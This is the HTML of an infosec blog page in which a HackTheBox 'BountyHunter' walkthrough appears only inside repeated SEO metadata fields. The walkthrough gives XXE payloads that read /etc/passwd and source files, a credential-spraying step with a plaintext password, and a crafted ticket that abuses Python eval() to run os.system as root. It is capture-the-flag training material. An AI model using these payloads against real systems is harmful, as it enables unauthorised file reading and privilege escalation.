<!DOCTYPE html>







<html lang="en" 
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    <!-- i18n for `_javascript/utils/timeago.js` -->
    <meta name="day-prompt" content="days ago">
    <meta name="hour-prompt" content="hours ago">
    <meta name="minute-prompt" content="minutes ago">
    <meta name="justnow-prompt" content="just now">

    

    

  

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="HackTheBox - BountyHunter" />
<meta name="author" content="The Archivist" />
<meta property="og:locale" content="en" />
<meta name="description" content="Today, we are delving into BountyHunter as another HackTheBox machine in our sidetrack series. I hope you have a nice weekend and without further ado, let us jump right in! Enumeration Nmap output 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ┌──(kali㉿kali)-[~/Desktop/HTB/Boxes/BountyHunter] └─$ cat nmap/BountyHunter.nmap # Nmap 7.91 scan initiated Sat Oct 2 22:12:07 2021 as: nmap -sS -sV -sC -p- -v -oA nmap/BountyHunter 10.10.11.100 Nmap scan report for 10.10.11.100 Host is up (0.048s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA) | 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA) |_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Bounty Hunters Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Based on nmap result, Apache and SSH service were running on port 80 and 22, respectively. The default index shows no conspicuous detail aside from its portal redirecting to a report form. Initially, several XSS/SQLi payloads were tested but displayed incapable of producing any useful result, albeit the input values seemed not to be filtered or sanitized for special characters. Exploitation XML Eternal Entity As the above solution is not possible, let us use BurpSuite to intercept requests and get a closer look. From here you can tell that the value of data field is encoded, so I prefer using CyberChef, a powerful yet simple utility, to analyze and decode it. Our recipe consists of URL Decode and From Base64, sequentially. The output is of XML and thereby allowing us to interfere and view files on the target server filesystem as well as other back-end sources or external entities that the server itself can access. This is an XXE injection, a type of attack against an application that parses XML input. You can read more about XXE here. Thanks to that, we can make an attempt to trigger the XXE vulnerability. The following payload includes and shows us the /etc/passwd on the server. 1 2 3 4 5 6 7 8 9 10 &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt; &lt;bugreport&gt; &lt;title&gt;&amp;xxe;&lt;/title&gt; &lt;cwe&gt;x&lt;/cwe&gt; &lt;cvss&gt;x&lt;/cvss&gt; &lt;reward&gt;aaaa&gt;&lt;/reward&gt; &lt;/bugreport&gt; And the return is: In case the expect:// module is available on the target server then you can craft your payload as below and actually get RCE. 1 2 3 4 5 6 7 8 9 10 &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;expect://ls&quot; &gt;]&gt; &lt;!-- execute &quot;ls&quot; command --&gt; &lt;bugreport&gt; &lt;title&gt;&amp;xxe;&lt;/title&gt; &lt;cwe&gt;x&lt;/cwe&gt; &lt;cvss&gt;x&lt;/cvss&gt; &lt;reward&gt;aaaa&gt;&lt;/reward&gt; &lt;/bugreport&gt; Unfortunately, the result is just four empty fields, which indicates that expect:// is not loaded or this is a blind injection. Not really matter, though. We still have another solution of using a PHP wrapper to retrieve back-end files on the server. If you still remember, we have already used it in one of my university challenges. So our new payload is as following: 1 2 3 4 5 6 7 8 9 10 &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot; &gt;]&gt; &lt;bugreport&gt; &lt;title&gt;&amp;xxe;&lt;/title&gt; &lt;cwe&gt;x&lt;/cwe&gt; &lt;cvss&gt;x&lt;/cvss&gt; &lt;reward&gt;aaaa&gt;&lt;/reward&gt; &lt;/bugreport&gt; It reads and encodes index.php on the server to a base64 string. Yet it is just some HTML and CSS, nothing special so I have gobuster enumerating .php and other sensitive extensions. After retrieving db.php and decoding the content, we have some credentials. But neither test nor admin was a valid username for SSH login, so I try looking for another user with console on the server system by searching for /bin/bash or /home/(username) in the /etc/passwd file. There are just root and Development. Credentials spraying with CME In this step, CrackMapExec (CME) should be able to help us get into the server internal. In order to work, CME needs two files containing all usernames and passwords (i.e, user.txt and pass.txt). And the valid credentials are: development:m19RoAU0hP41A1sTsq6K. Privilege Escalation To know whether development user is capable of executing command as superuser or not, try $ sudo -l: 1 2 3 4 5 6 7 8 9 10 11 development@bountyhunter:~$ sudo -l Matching Defaults entries for development on bountyhunter: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User development may run the following commands on bountyhunter: (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py As can be seen, development can execute /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py as root without password. Eval() == Evil Reading /opt/skytrain_inc/ticketValidator.py source. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 #Skytrain Inc Ticket Validation System 0.1 #Do not distribute this file. def load_file(loc): if loc.endswith(&quot;.md&quot;): return open(loc, &#39;r&#39;) else: print(&quot;Wrong file type.&quot;) exit() def evaluate(ticketFile): #Evaluates a ticket to check for ireggularities. code_line = None for i,x in enumerate(ticketFile.readlines()): if i == 0: if not x.startswith(&quot;# Skytrain Inc&quot;): return False continue if i == 1: if not x.startswith(&quot;## Ticket to &quot;): return False print(f&quot;Destination: {&#39; &#39;.join(x.strip().split(&#39; &#39;)[3:])}&quot;) continue if x.startswith(&quot;__Ticket Code:__&quot;): code_line = i+1 continue if code_line and i == code_line: if not x.startswith(&quot;**&quot;): return False ticketCode = x.replace(&quot;**&quot;, &quot;&quot;).split(&quot;+&quot;)[0] if int(ticketCode) % 7 == 4: validationNumber = eval(x.replace(&quot;**&quot;, &quot;&quot;)) if validationNumber &gt; 100: return True else: return False return False def main(): fileName = input(&quot;Please enter the path to the ticket file.\n&quot;) ticket = load_file(fileName) #DEBUG print(ticket) result = evaluate(ticket) if (result): print(&quot;Valid ticket.&quot;) else: print(&quot;Invalid ticket.&quot;) ticket.close main() Code breakdown: load_file checks whether the file extension is .md or not. evaluate returns False whether the first line doesn’t start with # Skytrain Inc or ## Ticket to; otherwise, prints the destination and continues. reads the string below “__Ticket Code:__”, removes (**) and thereafter assigns the number before the (+) operator asticketCode. Executes the following string as code whether the modulo of ticketCode and 7 is 4. Hence, our root_ticket.md: 1 2 3 4 5 6 Skytrain Inc ## Ticket to New Haven __Ticket Code:__ **32+100 and __import__(&#39;os&#39;).system(&#39;cat /root/root.txt&#39;) ##Issued: 2021/10/03 #End Ticket" />
<meta property="og:description" content="Today, we are delving into BountyHunter as another HackTheBox machine in our sidetrack series. I hope you have a nice weekend and without further ado, let us jump right in! Enumeration Nmap output 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ┌──(kali㉿kali)-[~/Desktop/HTB/Boxes/BountyHunter] └─$ cat nmap/BountyHunter.nmap # Nmap 7.91 scan initiated Sat Oct 2 22:12:07 2021 as: nmap -sS -sV -sC -p- -v -oA nmap/BountyHunter 10.10.11.100 Nmap scan report for 10.10.11.100 Host is up (0.048s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA) | 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA) |_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Bounty Hunters Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Based on nmap result, Apache and SSH service were running on port 80 and 22, respectively. The default index shows no conspicuous detail aside from its portal redirecting to a report form. Initially, several XSS/SQLi payloads were tested but displayed incapable of producing any useful result, albeit the input values seemed not to be filtered or sanitized for special characters. Exploitation XML Eternal Entity As the above solution is not possible, let us use BurpSuite to intercept requests and get a closer look. From here you can tell that the value of data field is encoded, so I prefer using CyberChef, a powerful yet simple utility, to analyze and decode it. Our recipe consists of URL Decode and From Base64, sequentially. The output is of XML and thereby allowing us to interfere and view files on the target server filesystem as well as other back-end sources or external entities that the server itself can access. This is an XXE injection, a type of attack against an application that parses XML input. You can read more about XXE here. Thanks to that, we can make an attempt to trigger the XXE vulnerability. The following payload includes and shows us the /etc/passwd on the server. 1 2 3 4 5 6 7 8 9 10 &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt; &lt;bugreport&gt; &lt;title&gt;&amp;xxe;&lt;/title&gt; &lt;cwe&gt;x&lt;/cwe&gt; &lt;cvss&gt;x&lt;/cvss&gt; &lt;reward&gt;aaaa&gt;&lt;/reward&gt; &lt;/bugreport&gt; And the return is: In case the expect:// module is available on the target server then you can craft your payload as below and actually get RCE. 1 2 3 4 5 6 7 8 9 10 &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;expect://ls&quot; &gt;]&gt; &lt;!-- execute &quot;ls&quot; command --&gt; &lt;bugreport&gt; &lt;title&gt;&amp;xxe;&lt;/title&gt; &lt;cwe&gt;x&lt;/cwe&gt; &lt;cvss&gt;x&lt;/cvss&gt; &lt;reward&gt;aaaa&gt;&lt;/reward&gt; &lt;/bugreport&gt; Unfortunately, the result is just four empty fields, which indicates that expect:// is not loaded or this is a blind injection. Not really matter, though. We still have another solution of using a PHP wrapper to retrieve back-end files on the server. If you still remember, we have already used it in one of my university challenges. So our new payload is as following: 1 2 3 4 5 6 7 8 9 10 &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot; &gt;]&gt; &lt;bugreport&gt; &lt;title&gt;&amp;xxe;&lt;/title&gt; &lt;cwe&gt;x&lt;/cwe&gt; &lt;cvss&gt;x&lt;/cvss&gt; &lt;reward&gt;aaaa&gt;&lt;/reward&gt; &lt;/bugreport&gt; It reads and encodes index.php on the server to a base64 string. Yet it is just some HTML and CSS, nothing special so I have gobuster enumerating .php and other sensitive extensions. After retrieving db.php and decoding the content, we have some credentials. But neither test nor admin was a valid username for SSH login, so I try looking for another user with console on the server system by searching for /bin/bash or /home/(username) in the /etc/passwd file. There are just root and Development. Credentials spraying with CME In this step, CrackMapExec (CME) should be able to help us get into the server internal. In order to work, CME needs two files containing all usernames and passwords (i.e, user.txt and pass.txt). And the valid credentials are: development:m19RoAU0hP41A1sTsq6K. Privilege Escalation To know whether development user is capable of executing command as superuser or not, try $ sudo -l: 1 2 3 4 5 6 7 8 9 10 11 development@bountyhunter:~$ sudo -l Matching Defaults entries for development on bountyhunter: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User development may run the following commands on bountyhunter: (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py As can be seen, development can execute /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py as root without password. Eval() == Evil Reading /opt/skytrain_inc/ticketValidator.py source. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 #Skytrain Inc Ticket Validation System 0.1 #Do not distribute this file. def load_file(loc): if loc.endswith(&quot;.md&quot;): return open(loc, &#39;r&#39;) else: print(&quot;Wrong file type.&quot;) exit() def evaluate(ticketFile): #Evaluates a ticket to check for ireggularities. code_line = None for i,x in enumerate(ticketFile.readlines()): if i == 0: if not x.startswith(&quot;# Skytrain Inc&quot;): return False continue if i == 1: if not x.startswith(&quot;## Ticket to &quot;): return False print(f&quot;Destination: {&#39; &#39;.join(x.strip().split(&#39; &#39;)[3:])}&quot;) continue if x.startswith(&quot;__Ticket Code:__&quot;): code_line = i+1 continue if code_line and i == code_line: if not x.startswith(&quot;**&quot;): return False ticketCode = x.replace(&quot;**&quot;, &quot;&quot;).split(&quot;+&quot;)[0] if int(ticketCode) % 7 == 4: validationNumber = eval(x.replace(&quot;**&quot;, &quot;&quot;)) if validationNumber &gt; 100: return True else: return False return False def main(): fileName = input(&quot;Please enter the path to the ticket file.\n&quot;) ticket = load_file(fileName) #DEBUG print(ticket) result = evaluate(ticket) if (result): print(&quot;Valid ticket.&quot;) else: print(&quot;Invalid ticket.&quot;) ticket.close main() Code breakdown: load_file checks whether the file extension is .md or not. evaluate returns False whether the first line doesn’t start with # Skytrain Inc or ## Ticket to; otherwise, prints the destination and continues. reads the string below “__Ticket Code:__”, removes (**) and thereafter assigns the number before the (+) operator asticketCode. Executes the following string as code whether the modulo of ticketCode and 7 is 4. Hence, our root_ticket.md: 1 2 3 4 5 6 Skytrain Inc ## Ticket to New Haven __Ticket Code:__ **32+100 and __import__(&#39;os&#39;).system(&#39;cat /root/root.txt&#39;) ##Issued: 2021/10/03 #End Ticket" />
<link rel="canonical" href="https://legiahuyy.github.io/blog/en/posts/HTB-BountyHunter/" />
<meta property="og:url" content="https://legiahuyy.github.io/blog/en/posts/HTB-BountyHunter/" />
<meta property="og:site_name" content="Another infosec blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-10-03T00:00:00+08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="HackTheBox - BountyHunter" />
<meta name="twitter:site" content="@0x7c00" />
<meta name="twitter:creator" content="@The Archivist" />
<meta name="google-site-verification" content="google_meta_tag_verification" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"HackTheBox - BountyHunter","url":"https://legiahuyy.github.io/blog/en/posts/HTB-BountyHunter/","dateModified":"2021-10-03T00:00:00+08:00","datePublished":"2021-10-03T00:00:00+08:00","author":{"@type":"Person","name":"The Archivist"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://legiahuyy.github.io/blog/en/posts/HTB-BountyHunter/"},"description":"Today, we are delving into BountyHunter as another HackTheBox machine in our sidetrack series. I hope you have a nice weekend and without further ado, let us jump right in! Enumeration Nmap output 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ┌──(kali㉿kali)-[~/Desktop/HTB/Boxes/BountyHunter] └─$ cat nmap/BountyHunter.nmap # Nmap 7.91 scan initiated Sat Oct 2 22:12:07 2021 as: nmap -sS -sV -sC -p- -v -oA nmap/BountyHunter 10.10.11.100 Nmap scan report for 10.10.11.100 Host is up (0.048s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA) | 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA) |_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Bounty Hunters Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Based on nmap result, Apache and SSH service were running on port 80 and 22, respectively. The default index shows no conspicuous detail aside from its portal redirecting to a report form. Initially, several XSS/SQLi payloads were tested but displayed incapable of producing any useful result, albeit the input values seemed not to be filtered or sanitized for special characters. Exploitation XML Eternal Entity As the above solution is not possible, let us use BurpSuite to intercept requests and get a closer look. From here you can tell that the value of data field is encoded, so I prefer using CyberChef, a powerful yet simple utility, to analyze and decode it. Our recipe consists of URL Decode and From Base64, sequentially. The output is of XML and thereby allowing us to interfere and view files on the target server filesystem as well as other back-end sources or external entities that the server itself can access. This is an XXE injection, a type of attack against an application that parses XML input. You can read more about XXE here. Thanks to that, we can make an attempt to trigger the XXE vulnerability. The following payload includes and shows us the /etc/passwd on the server. 1 2 3 4 5 6 7 8 9 10 &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt; &lt;bugreport&gt; &lt;title&gt;&amp;xxe;&lt;/title&gt; &lt;cwe&gt;x&lt;/cwe&gt; &lt;cvss&gt;x&lt;/cvss&gt; &lt;reward&gt;aaaa&gt;&lt;/reward&gt; &lt;/bugreport&gt; And the return is: In case the expect:// module is available on the target server then you can craft your payload as below and actually get RCE. 1 2 3 4 5 6 7 8 9 10 &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;expect://ls&quot; &gt;]&gt; &lt;!-- execute &quot;ls&quot; command --&gt; &lt;bugreport&gt; &lt;title&gt;&amp;xxe;&lt;/title&gt; &lt;cwe&gt;x&lt;/cwe&gt; &lt;cvss&gt;x&lt;/cvss&gt; &lt;reward&gt;aaaa&gt;&lt;/reward&gt; &lt;/bugreport&gt; Unfortunately, the result is just four empty fields, which indicates that expect:// is not loaded or this is a blind injection. Not really matter, though. We still have another solution of using a PHP wrapper to retrieve back-end files on the server. If you still remember, we have already used it in one of my university challenges. So our new payload is as following: 1 2 3 4 5 6 7 8 9 10 &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot; &gt;]&gt; &lt;bugreport&gt; &lt;title&gt;&amp;xxe;&lt;/title&gt; &lt;cwe&gt;x&lt;/cwe&gt; &lt;cvss&gt;x&lt;/cvss&gt; &lt;reward&gt;aaaa&gt;&lt;/reward&gt; &lt;/bugreport&gt; It reads and encodes index.php on the server to a base64 string. Yet it is just some HTML and CSS, nothing special so I have gobuster enumerating .php and other sensitive extensions. After retrieving db.php and decoding the content, we have some credentials. But neither test nor admin was a valid username for SSH login, so I try looking for another user with console on the server system by searching for /bin/bash or /home/(username) in the /etc/passwd file. There are just root and Development. Credentials spraying with CME In this step, CrackMapExec (CME) should be able to help us get into the server internal. In order to work, CME needs two files containing all usernames and passwords (i.e, user.txt and pass.txt). And the valid credentials are: development:m19RoAU0hP41A1sTsq6K. Privilege Escalation To know whether development user is capable of executing command as superuser or not, try $ sudo -l: 1 2 3 4 5 6 7 8 9 10 11 development@bountyhunter:~$ sudo -l Matching Defaults entries for development on bountyhunter: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User development may run the following commands on bountyhunter: (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py As can be seen, development can execute /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py as root without password. Eval() == Evil Reading /opt/skytrain_inc/ticketValidator.py source. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 #Skytrain Inc Ticket Validation System 0.1 #Do not distribute this file. def load_file(loc): if loc.endswith(&quot;.md&quot;): return open(loc, &#39;r&#39;) else: print(&quot;Wrong file type.&quot;) exit() def evaluate(ticketFile): #Evaluates a ticket to check for ireggularities. code_line = None for i,x in enumerate(ticketFile.readlines()): if i == 0: if not x.startswith(&quot;# Skytrain Inc&quot;): return False continue if i == 1: if not x.startswith(&quot;## Ticket to &quot;): return False print(f&quot;Destination: {&#39; &#39;.join(x.strip().split(&#39; &#39;)[3:])}&quot;) continue if x.startswith(&quot;__Ticket Code:__&quot;): code_line = i+1 continue if code_line and i == code_line: if not x.startswith(&quot;**&quot;): return False ticketCode = x.replace(&quot;**&quot;, &quot;&quot;).split(&quot;+&quot;)[0] if int(ticketCode) % 7 == 4: validationNumber = eval(x.replace(&quot;**&quot;, &quot;&quot;)) if validationNumber &gt; 100: return True else: return False return False def main(): fileName = input(&quot;Please enter the path to the ticket file.\\n&quot;) ticket = load_file(fileName) #DEBUG print(ticket) result = evaluate(ticket) if (result): print(&quot;Valid ticket.&quot;) else: print(&quot;Invalid ticket.&quot;) ticket.close main() Code breakdown: load_file checks whether the file extension is .md or not. evaluate returns False whether the first line doesn’t start with # Skytrain Inc or ## Ticket to; otherwise, prints the destination and continues. reads the string below “__Ticket Code:__”, removes (**) and thereafter assigns the number before the (+) operator asticketCode. Executes the following string as code whether the modulo of ticketCode and 7 is 4. Hence, our root_ticket.md: 1 2 3 4 5 6 Skytrain Inc ## Ticket to New Haven __Ticket Code:__ **32+100 and __import__(&#39;os&#39;).system(&#39;cat /root/root.txt&#39;) ##Issued: 2021/10/03 #End Ticket","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <title>HackTheBox - BountyHunter | Another infosec blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/blog/en/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/blog/en/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/blog/en/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/blog/en/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/blog/en/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Another infosec blog">
<meta name="application-name" content="Another infosec blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/blog/en/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- GA -->
  

  <!-- jsDelivr CDN -->
  <link rel="preconnect" href="https://cdn.jsdelivr.net">
  <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/blog/en/assets/css/style.css">


  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">



  <!-- Manific Popup -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">



  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

</head>


  <body data-spy="scroll" data-target="#toc">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end" lang="en">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/blog/en/" alt="avatar" class="mx-auto">
        
          
          <img src="/blog/en/assets/img/avatar.gif" alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/blog/en/">Another infosec blog</a>
    </div>
    <div class="site-subtitle font-italic">Where one's enthusiasm provides knowledge and comprehension for others.</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/blog/en/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/blog/en/about/" class="nav-link">
        <i class="fa-fw  ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/blog/en/archives/" class="nav-link">
        <i class="fa-fw  ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/blog/en/categories/" class="nav-link">
        <i class="fa-fw  ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/blog/en/tags/" class="nav-link">
        <i class="fa-fw  ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    
      

      
      <a href="https://github.com/legiahuyy" aria-label="github"
        class="order-3"
        target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/0x7c00" aria-label="twitter"
        class="order-4"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['legiahuy420','gmail.com'].join('@')" aria-label="email"
        class="order-5"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/blog/en/feed.xml" aria-label="rss"
        class="order-6"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

    
      
        <span class="icon-border order-2"></span>
      

      <span id="mode-toggle-wrapper" class="order-1">
        <!--
  Switch the mode between dark and light.
-->

<i class="mode-toggle fas fa-adjust"></i>

<script type="text/javascript">

  class ModeToggle {
    static get MODE_KEY() { return "mode"; }
    static get DARK_MODE() { return "dark"; }
    static get LIGHT_MODE() { return "light"; }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      var self = this;

      /* always follow the system prefers */
      this.sysDarkPrefers.addListener(function() {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }

          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.updateMermaid();
      });

    } /* constructor() */


    setDark() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      $('html').removeAttr(ModeToggle.MODE_KEY);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }

    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }

    get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; }

    get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; }

    get hasMode() { return this.mode != null; }

    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode
        || (!this.hasMode && this.isSysDarkPrefer) ) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    updateMermaid() {
      if (typeof mermaid !== "undefined") {
        let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default");
        let config = { theme: expectedTheme };

